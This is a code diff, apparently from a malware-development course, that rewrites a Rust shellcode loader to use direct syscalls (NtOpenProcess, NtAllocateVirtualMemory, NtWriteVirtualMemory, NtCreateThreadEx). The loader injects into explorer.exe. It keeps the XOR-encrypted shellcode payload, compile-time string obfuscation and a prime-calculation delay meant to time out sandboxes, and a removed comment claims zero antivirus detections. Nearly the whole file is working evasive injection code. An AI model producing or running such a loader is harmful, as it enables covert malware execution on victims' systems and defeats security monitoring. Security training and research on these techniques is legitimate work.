@@ -1,20 +1,23 @@
-// While there is a lot more evasion to do here, this example gets 0/26 on Antiscan.me at the time of writing
+// Base code taken from Exercise 3, refer there if anything is unclear
 
-// We are using the obfstr crate, which introduces a macro to obfuscate strings at compile time
-// Try running strings on the compiled artefact and finding our suspicious strings from below!
+// We add the 'rust_syscalls' crate, which makes using (in)direct syscalls a lot easier
+// Direct system calls are used, as per the feature chosen in 'Cargo.toml'
+use rust_syscalls::syscall;
+
 use obfstr::obfstr;
-
-// Other imports are the same as Exercise 2
-use std::ptr;
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
 use windows_sys::Win32::{
     Foundation::*,
-    System::{Diagnostics::Debug::*, Memory::*, Threading::*},
+    System::{
+        Kernel::*,
+        Memory::*,
+        Threading::*,
+        WindowsProgramming::*,
+    },
 };
 
-// Helper function to calculate primes used for sandbox evasion
 #[no_mangle]
-#[inline(never)] // Tell the compiler not to optimize our function :)
+#[inline(never)]
 fn calc_primes(iterations: i32) -> () {
     let mut prime = 2;
     let mut i = 0;
@@ -35,73 +38,133 @@ fn calc_primes(iterations: i32) -> () {
     }
 }
 
-// Same helper function as in 'encrypt.rs'
 fn xor_array(array: &mut [u8], key: u8) -> () {
     for byte in array {
         *byte ^= key;
     }
 }
 
-// Same injection function as in Exercise 2, refer there if anything is unclear
-// OPSEC tweaks have been added as comments
+// This time around, we are a bit more sparse with our 'unsafe' blocks
+// This allows Rust to safely manage memory outside of our API calls
 fn inject_remote(shellcode: &[u8], process_id: u32) {
+    let mut status: NTSTATUS;
+    
+    // OpenProcess is replaced with NtOpenProcess
+    // Initialize the required structures to populate with our call
+    let mut oa: OBJECT_ATTRIBUTES64 = OBJECT_ATTRIBUTES64 {
+        Length: std::mem::size_of::<OBJECT_ATTRIBUTES64>() as _,
+        RootDirectory: NULL64 as _,
+        ObjectName: NULL64 as _,
+        Attributes: 0,
+        SecurityDescriptor: NULL64 as _,
+        SecurityQualityOfService: NULL64 as _,
+    };
+    
+    let mut cid: CLIENT_ID = CLIENT_ID {
+        UniqueProcess: process_id as _,
+        UniqueThread: 0
+    };
+    
+    // Make the syscall for the actual native API
+    let mut p_handle: HANDLE = NULL64 as _;
     unsafe {
-        let p_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);
-        // We use the 'obfstr!' macro to obfuscate strings here
-        // Because 'println!' expects a string literal, we need to use format strings instead
-        println!(
-            "{} {:?}",
-            obfstr!("[+] Got target process handle:"),
-            p_handle
+        status = syscall!(
+            "NtOpenProcess",
+            &mut p_handle,
+            PROCESS_ALL_ACCESS,
+            &mut oa,
+            &mut cid
         );
+    }
+        
+    println!(
+        "{} {:?} {} {:?}",
+        obfstr!("[+] Got target process handle"),
+        p_handle,
+        obfstr!("with status"),
+        status
+    );
 
-        let r_ptr = VirtualAllocEx(
+
+    // VirtualAllocEx is replaced with NtAllocateVirtualMemory
+    let r_ptr = NULL64 as *mut u8;
+    let shellcode_size = shellcode.len() as isize;
+
+    unsafe {
+        status = syscall!(
+            "NtAllocateVirtualMemory",
             p_handle,
-            ptr::null(),
-            shellcode.len(),
+            &r_ptr,
+            0,
+            &shellcode_size,
             MEM_COMMIT,
-            PAGE_EXECUTE_READWRITE,
+            PAGE_EXECUTE_READWRITE
         );
-        println!(
-            "{} {:?}",
-            obfstr!("[+] Allocated RWX memory in remote process at address"),
-            r_ptr
-        );
+    }
 
-        let mut bytes_written = 0;
-        WriteProcessMemory(
+    println!(
+        "{} {:?} {} {:?}",
+        obfstr!("[+] Allocated RWX memory in remote process at address"),
+        r_ptr,
+        obfstr!("with status"),
+        status
+    );
+
+    // WriteProcessMemory is replaced with NtWriteVirtualMemory
+    let mut bytes_written: usize = 0;
+    unsafe {
+        status = syscall!(
+            "NtWriteVirtualMemory",
             p_handle,
             r_ptr,
-            shellcode.as_ptr() as _,
-            shellcode.len(),
-            &mut bytes_written,
+            shellcode.as_ptr(),
+            shellcode_size,
+            &mut bytes_written
         );
-        println!(
-            "{} {} {}",
-            obfstr!("[+] Wrote"),
-            bytes_written,
-            obfstr!("bytes to remote process memory!")
-        );
+    }
 
-        let t_handle = CreateRemoteThread(
+    println!(
+        "{} {:?} {} {:?}",
+        obfstr!("[+] Wrote"),
+        bytes_written,
+        obfstr!("bytes with status"),
+        status
+    );
+
+    // CreateRemoteThread is replaced with NtCreateThreadEx
+    let mut t_handle = NULL64 as HANDLE;
+
+    unsafe {
+        status = syscall!(
+            "NtCreateThreadEx",
+            &mut t_handle,
+            THREAD_ALL_ACCESS,
+            NULL64 as isize, // Equivalent of IntPtr
             p_handle,
-            ptr::null(),
+            r_ptr,
+            NULL64 as isize,
+            FALSE,
             0,
-            Some(std::mem::transmute(r_ptr)),
-            ptr::null(),
             0,
-            ptr::null_mut(),
+            0,
+            NULL64 as isize
         );
-        println!("{}", obfstr!("[+] Created remote thread!"));
+    }
 
-        CloseHandle(t_handle);
-        CloseHandle(p_handle);
+    println!(
+        "{} {:?}",
+        obfstr!("[+] Created remote thread with status"), 
+        status
+    );
+
+    // 'CloseHandle' is replaced with 'NtClose'
+    unsafe {
+        syscall!("NtClose", t_handle);
+        syscall!("NtClose", p_handle);
     }
 }
 
 fn main() {
-    // Define our ENCRYPTED shellcode here
-    // Output taken from 'encrypt.rs'
     let mut shellcode: [u8; 296] = [
         0xcb, 0x7f, 0xb4, 0xd3, 0xc7, 0xdf, 0xf7, 0x37, 0x37, 0x37, 0x76, 0x66, 0x76, 0x67, 0x65,
         0x66, 0x61, 0x7f, 0x06, 0xe5, 0x52, 0x7f, 0xbc, 0x65, 0x57, 0x7f, 0xbc, 0x65, 0x2f, 0x7f,
@@ -125,12 +188,8 @@ fn main() {
         0x05, 0x6b, 0x54, 0x56, 0x5b, 0x54, 0x19, 0x52, 0x4f, 0x52, 0x37,
     ];
 
-    // Perform prime calculations until a very high number is reached
-    // This will take a while, hopefully timing out any sandboxes inspecting us
-    // (This was not needed to reduce static detections in testing, but is good practice against basic dynamic analysis)
-    calc_primes(40000); // about 30 seconds depending on CPU and build type (debug vs release)
+    calc_primes(40000);
 
-    // Find the "explorer.exe" as in Exercise 2
     let s = System::new_all();
     let process_id: u32 = s
         .processes_by_name(obfstr!("explorer"))
@@ -145,9 +204,7 @@ fn main() {
         process_id
     );
 
-    // Decode our shellcode in-place
     xor_array(&mut shellcode, 0x37);
 
-    // Call our shellcode
     inject_remote(&shellcode, process_id);
 }
